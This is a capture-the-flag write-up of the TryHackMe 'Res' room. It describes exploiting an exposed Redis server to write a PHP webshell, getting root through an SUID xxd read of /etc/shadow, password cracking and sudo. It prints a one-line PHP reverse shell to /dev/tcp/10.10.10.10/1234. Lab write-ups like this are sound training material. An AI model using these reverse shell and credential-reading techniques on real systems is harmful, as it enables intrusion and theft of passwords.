# Res - Writeup

**Date**: 27/03/2022

**Difficulty**: Easy

**CTF**: [https://tryhackme.com/room/res](https://tryhackme.com/room/res)

---

Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

# Scan the machine, how many ports are open?

![Untitled](images/Untitled.png)

# What’s the database management system installed on the server? What port is the database management system running on?What's is the version of management system installed on the server?

![Untitled](images/Untitled%201.png)

# Compromise the machine and locate user.txt

First of all, let’s visit the webpage hosted on the port 80:

![Untitled](images/Untitled%202.png)

It displays a default page of an apache server recently installed.

As we have seen, there is a redis server running on port 6379. After some reading, I found that there is a way to interact with this service.

Let’s download the redis application:

[https://redis.io/docs/getting-started/](https://redis.io/docs/getting-started/) 

[https://redis.io/docs/manual/cli/](https://redis.io/docs/manual/cli/)

Let’s test the connection:

![Untitled](images/Untitled%203.png)

It seems like we have connection with the redis server!

![Untitled](images/Untitled%204.png)

The info command seems to be helpful to retrieve redis server information:

![Untitled](images/Untitled%205.png)

According to this webpage ([https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)) there is a way to do a Remote Code Execution on a redis server:

![Untitled](images/Untitled%206.png)

We should know the path where we want to write the php file. Since we have visited the page before, we know that the folder is: `/var/www/html`

So, following the steps we do the same in our case:

![Untitled](images/Untitled%207.png)

Now let’s visit the page:

![Untitled](images/Untitled%208.png)

It works, now let’s try to write a reverse shell in php:

![Untitled](images/Untitled%209.png)

Let’s open a netcat listener in our machine:

![Untitled](images/Untitled%2010.png)

And let’s visit the rs.php file:

![Untitled](images/Untitled%2011.png)

We got a connection but it quickly disconnects...

Let’s try with this other one-line php reverse shell:

```jsx
'<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.10.10/1234 0>&1\'"); ?>'
```

![Untitled](images/Untitled%2012.png)

![Untitled](images/Untitled%2013.png)

Yeah, this one works! 

![Untitled](images/Untitled%2014.png)

We found the key file in the /home/vianka folder.

# What is the local user account password?

Before anything, let’s try to stabilize this shell:

![Untitled](images/Untitled%2015.png)

Python is installed in the machine, so let’s use it:

![Untitled](images/Untitled%2016.png)

Ok, shell stabilized, now let’s look for the local user account password. Can we read /etc/shadow file?

![Untitled](images/Untitled%2017.png)

Nope, we can’t.

Something interesting in the history?

![Untitled](images/Untitled%2018.png)

Let’s see if we find some keys in the user directory... nothing useful I can see...

After spending some time looking for ssh keys or something useful, I look for files with SUID activated:

![Untitled](images/Untitled%2019.png)

From this list, xxd appears in the GTFO Bins list:

![Untitled](images/Untitled%2020.png)

Exploiting this, we should be able to read /etc/shadow file!

![Untitled](images/Untitled%2021.png)

Yeah! Now with the info of /etc/passwd, let’s use unshadow and John the ripper to crack the hash!

![Untitled](images/Untitled%2022.png)

Unshadow done, now let’s crack it!

![Untitled](images/Untitled%2023.png)

Cool!

# Escalate privileges and obtain root.txt

Let’s login as vianka and see if we have more permissions:

![Untitled](images/Untitled%2024.png)

Enough permissions to access to root folder?

![Untitled](images/Untitled%2025.png)

Nope. Let’s see what we can execute with sudo:

![Untitled](images/Untitled%2026.png)

Really? We can run any command using sudo...

![Untitled](images/Untitled%2027.png)

Woah

![Untitled](images/Untitled%2028.png)

And this quickly we get the last flag!